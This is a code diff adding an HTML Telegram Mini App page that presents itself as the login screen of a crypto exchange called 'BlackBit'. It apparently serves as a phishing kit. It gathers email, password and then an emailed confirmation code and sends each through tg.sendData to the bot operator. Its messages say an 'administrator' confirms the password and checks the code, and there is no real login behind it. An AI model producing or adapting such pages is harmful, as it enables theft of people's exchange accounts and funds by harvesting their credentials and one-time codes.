@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlackBit — вход</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* ===== БАЗОВЫЕ ПЕРЕМЕННЫЕ (адаптация под Telegram) ===== */
+        :root {
+            --font-family-main: "Roboto", sans-serif;
+            --font-weight-l: 300;
+            --font-weight-r: 400;
+            --font-weight-m: 500;
+            --font-weight-b: 700;
+            --font-size-xs: 10px;
+            --font-size-s: 12px;
+            --font-size-m: 13px;
+            --font-size-l: 14px;
+            --font-size-xl: 18px;
+            --color-white: #fff;
+            --color-black: #222;
+            --color-blue: #1badff;
+            --color-primary: #71cc52;
+            --color-primary-hover: #5ebb3d;
+            --color-secondary: #e52424;
+            --radius-m: 4px;
+            --radius-l: 6px;
+            --radius-xl: 8px;
+            --navbar-height: 60px;
+            
+            /* Telegram-адаптация */
+            --bg-color-primary: var(--tg-theme-bg-color, #ffffff);
+            --bg-color-secondary: var(--tg-theme-secondary-bg-color, #f7f7f9);
+            --text-color-primary: var(--tg-theme-text-color, #222222);
+            --text-color-secondary: var(--tg-theme-hint-color, #929aa5);
+            --input-background-color: var(--tg-theme-bg-color, #ffffff);
+            --input-border-color: var(--tg-theme-hint-color, #d0d0d0);
+        }
+
+        /* ===== ОБЩИЕ СТИЛИ ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family-main);
+            background-color: var(--bg-color-primary);
+            color: var(--text-color-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background-color: var(--bg-color-primary);
+            border-radius: var(--radius-xl);
+            padding: 32px 24px;
+            box-shadow: 0 1px 4px -1px rgba(0,0,0,.06), 0 2px 4px -1px rgba(0,0,0,.08);
+        }
+
+        /* ===== ЛОГОТИП ===== */
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .logo h1 {
+            font-size: 28px;
+            font-weight: var(--font-weight-b);
+            color: var(--text-color-primary);
+        }
+
+        .logo .subtitle {
+            font-size: var(--font-size-l);
+            color: var(--text-color-secondary);
+            margin-top: 4px;
+        }
+
+        /* ===== ОПИСАНИЕ ===== */
+        .description {
+            font-size: var(--font-size-s);
+            color: var(--text-color-primary);
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        .description strong {
+            color: var(--color-blue);
+        }
+
+        /* ===== ФОРМА ===== */
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: var(--font-size-s);
+            font-weight: var(--font-weight-m);
+            margin-bottom: 6px;
+            color: var(--text-color-secondary);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid var(--input-border-color);
+            border-radius: var(--radius-m);
+            background-color: var(--input-background-color);
+            color: var(--text-color-primary);
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: var(--color-blue);
+            box-shadow: 0 0 0 4px rgba(27, 173, 255, 0.15);
+        }
+
+        input.error {
+            border-color: var(--color-secondary);
+            box-shadow: 0 0 0 4px rgba(229, 36, 36, 0.15);
+        }
+
+        /* ===== КНОПКИ ===== */
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--color-primary);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-m);
+            font-size: 16px;
+            font-weight: var(--font-weight-m);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--color-primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(113, 204, 82, 0.3);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ===== ССЫЛКИ ===== */
+        .register-link {
+            text-align: center;
+            margin-top: 18px;
+            font-size: var(--font-size-s);
+            color: var(--text-color-secondary);
+        }
+
+        .register-link a {
+            color: var(--color-blue);
+            text-decoration: none;
+            font-weight: var(--font-weight-m);
+            transition: color 0.2s;
+        }
+
+        .register-link a:hover {
+            color: var(--color-blue);
+            text-decoration: underline;
+        }
+
+        /* ===== СТАТУС ===== */
+        #status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: var(--radius-m);
+            text-align: center;
+            display: none;
+            font-weight: var(--font-weight-m);
+            font-size: var(--font-size-s);
+        }
+
+        #status.error {
+            display: block;
+            background-color: rgba(229, 36, 36, 0.10);
+            color: var(--color-secondary);
+            border: 1px solid rgba(229, 36, 36, 0.15);
+        }
+
+        #status.success {
+            display: block;
+            background-color: rgba(113, 204, 82, 0.10);
+            color: var(--color-primary);
+            border: 1px solid rgba(113, 204, 82, 0.15);
+        }
+
+        #status.info {
+            display: block;
+            background-color: rgba(27, 173, 255, 0.08);
+            color: var(--color-blue);
+            border: 1px solid rgba(27, 173, 255, 0.1);
+        }
+
+        /* ===== ВСПОМОГАТЕЛЬНЫЕ КЛАССЫ ===== */
+        .hidden {
+            display: none !important;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .back-link a {
+            color: var(--text-color-secondary);
+            text-decoration: none;
+            font-size: var(--font-size-s);
+            cursor: pointer;
+            transition: color 0.2s;
+            font-weight: var(--font-weight-m);
+        }
+
+        .back-link a:hover {
+            color: var(--color-blue);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Логотип -->
+        <div class="logo">
+            <h1>BlackBit</h1>
+            <div class="subtitle">Криптовалютная биржа</div>
+        </div>
+
+        <!-- ОПИСАНИЕ ПРОЕКТА (меняй текст здесь) -->
+        <div class="description">
+            <p>🚀 <strong>BlackBit</strong> — это современная криптовалютная биржа для торговли цифровыми активами.</p>
+            <p>🔒 Безопасность, высокая скорость и низкие комиссии.</p>
+            <p>📈 Торгуй BTC, ETH, USDT и другими криптовалютами.</p>
+        </div>
+
+        <!-- Шаг 1: Логин и пароль -->
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" placeholder="your@email.com" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль" required>
+            </div>
+            <button type="submit" class="btn-primary" id="loginBtn">Войти</button>
+        </form>
+
+        <!-- Шаг 2: Код подтверждения -->
+        <form id="codeForm" class="hidden">
+            <div class="form-group">
+                <label for="code">Код подтверждения</label>
+                <input type="text" id="code" placeholder="Введите код из письма" required maxlength="6">
+            </div>
+            <button type="submit" class="btn-primary" id="codeBtn">Подтвердить</button>
+            <div class="back-link">
+                <a onclick="backToLogin()">← Назад</a>
+            </div>
+        </form>
+
+        <!-- Регистрация -->
+        <div class="register-link">
+            Нет аккаунта? <a href="#">Зарегистрироваться</a>
+        </div>
+
+        <!-- Статус -->
+        <div id="status"></div>
+    </div>
+
+    <script>
+        // ===== ИНИЦИАЛИЗАЦИЯ =====
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        // ===== DOM-ЭЛЕМЕНТЫ =====
+        const loginForm = document.getElementById('loginForm');
+        const codeForm = document.getElementById('codeForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const codeInput = document.getElementById('code');
+        const loginBtn = document.getElementById('loginBtn');
+        const codeBtn = document.getElementById('codeBtn');
+        const statusDiv = document.getElementById('status');
+
+        let currentEmail = '';
+
+        function showStatus(message, type) {
+            statusDiv.className = type;
+            statusDiv.textContent = message;
+        }
+
+        function hideStatus() {
+            statusDiv.className = '';
+            statusDiv.textContent = '';
+        }
+
+        function backToLogin() {
+            codeForm.classList.add('hidden');
+            loginForm.classList.remove('hidden');
+            hideStatus();
+            codeInput.value = '';
+            codeBtn.disabled = false;
+            codeBtn.innerHTML = 'Подтвердить';
+        }
+
+        // ===== ШАГ 1: ОТПРАВКА ЛОГИНА И ПАРОЛЯ =====
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!email || !password) {
+                showStatus('⚠️ Пожалуйста, заполните все поля', 'error');
+                return;
+            }
+
+            currentEmail = email;
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<span class="spinner"></span> Отправка...';
+            hideStatus();
+            showStatus('🔄 Отправка данных...', 'info');
+
+            const data = JSON.stringify({
+                step: 'login',
+                email: email,
+                password: password
+            });
+
+            console.log('📤 Отправка:', data);
+            tg.sendData(data);
+            console.log('✅ Данные отправлены!');
+
+            setTimeout(() => {
+                loginForm.classList.add('hidden');
+                codeForm.classList.remove('hidden');
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = 'Войти';
+                showStatus('📧 Ожидайте подтверждения пароля администратором', 'success');
+            }, 2000);
+        });
+
+        // ===== ШАГ 2: ОТПРАВКА КОДА =====
+        codeForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const code = codeInput.value.trim();
+
+            if (!code || code.length < 4) {
+                showStatus('⚠️ Введите код из письма (минимум 4 символа)', 'error');
+                return;
+            }
+
+            codeBtn.disabled = true;
+            codeBtn.innerHTML = '<span class="spinner"></span> Проверка...';
+            hideStatus();
+            showStatus('🔄 Проверка кода...', 'info');
+
+            const data = JSON.stringify({
+                step: 'code',
+                code: code,
+                email: currentEmail
+            });
+
+            console.log('📤 Отправка кода:', data);
+            tg.sendData(data);
+            console.log('✅ Код отправлен!');
+
+            setTimeout(() => {
+                codeBtn.disabled = false;
+                codeBtn.innerHTML = 'Подтвердить';
+                showStatus('📨 Код отправлен на проверку администратору', 'success');
+            }, 2000);
+        });
+
+        console.log('✅ BlackBit Mini App загружен');
+        console.log('👤 Пользователь:', tg.initDataUnsafe?.user?.username || 'Гость');
+    </script>
+</body>
+</html>
